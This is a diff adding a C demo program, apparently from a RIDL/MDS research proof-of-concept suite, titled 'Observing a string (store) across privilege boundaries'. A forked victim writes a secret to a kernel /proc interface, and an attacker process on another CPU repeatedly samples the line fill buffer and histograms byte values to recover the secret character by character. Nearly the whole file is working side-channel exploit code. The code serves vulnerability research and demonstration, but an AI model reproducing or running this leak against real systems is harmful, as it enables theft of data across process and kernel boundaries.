@@ -1,0 +1,96 @@
+#include "../primitives/basic_primitives.h"
+#include <stdlib.h>
+#include <stdio.h>
+#include <string.h>
+#include <signal.h>
+#include <unistd.h>
+#include <sys/mman.h>
+#include "utils.h"
+
+
+#define REPS 200000
+#define WRITE_VALUE 42ull
+#define CYCLE_LENGTH 400000000ull
+#define PROC_INTERFACE "/proc/RIDL_interface"
+
+
+int writer_cpu = 3, reader_cpu = 7, pid = 0;
+int hits[256];
+
+inline void victim(char *secret, int cycle_length) {
+    set_processor_affinity(writer_cpu);
+    uint64_t * destination = aligned_alloc(_page_size, _page_size);
+    int procfile = open("/proc/RIDL_interface", O_WRONLY);
+    if(procfile < 0){
+        printf("Failed to open the /proc file. Are you root?\n");
+    }else{
+        write(procfile, secret, strlen(secret));
+        close(procfile);
+    }
+    while (1) { store_and_flush(7, destination); }
+}
+
+void attacker(void *mem, uint64_t cycle_length) {
+    set_processor_affinity(reader_cpu);
+
+    struct timespec spec;
+    uint64_t t;
+
+    clock_gettime(CLOCK_REALTIME, &spec);
+    t = time_convert(&spec);
+    while (1) {
+        memset(hits, 0, sizeof(hits[0]) * 256);
+        while (time_convert(&spec) - t < cycle_length) {
+            int reps = 1000;
+            while (reps--) {
+                int value = lfb_read(mem);
+                if (value > 0) hits[value & 0xFF]++;
+            }
+            clock_gettime(CLOCK_REALTIME, &spec);
+        }
+        int max = -1, max_i = 0;
+        for (int i = 1; i < 256; i++) {
+            if (hits[i] > max) {
+                max_i = i;
+                max = hits[i];
+            }
+        }
+        clock_gettime(CLOCK_REALTIME, &spec);
+        t = time_convert(&spec);
+        printf("%c", max_i);
+        fflush(stdout);
+        if (max_i == 7) break;
+    }
+    printf("\n");
+}
+
+
+int main() {
+    if(access(PROC_INTERFACE, F_OK)){
+        printf("The RIDL kernel module does not seem to be loaded. Make sure that you load 'kernel_module/ridl_module.ko' before running this demo!\n");
+        return 1;
+    }
+    printf("Demo 2c: Observing a string (store) across privilege boundaries\n");
+    _page_size = getpagesize();
+    time_t tm;
+    time(&tm);
+    srand(tm);
+    char *secret = sample_strings[random() % 3];
+    uint8_t *mem =
+            mmap(NULL, _page_size * 257, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE | MAP_HUGETLB, -1, 0) + 1;
+    memset(mem, 0xFF, _page_size * 256);
+    ridl_init();
+    pid = fork();
+    if (!pid) {
+        victim(secret, 1);
+        return 0;
+    }
+    attacker(mem, CYCLE_LENGTH);
+    kill(pid, SIGKILL);
+    usleep(10000);
+
+    ridl_cleanup();
+    printf("Done.\n");
+    return 0;
+}
+
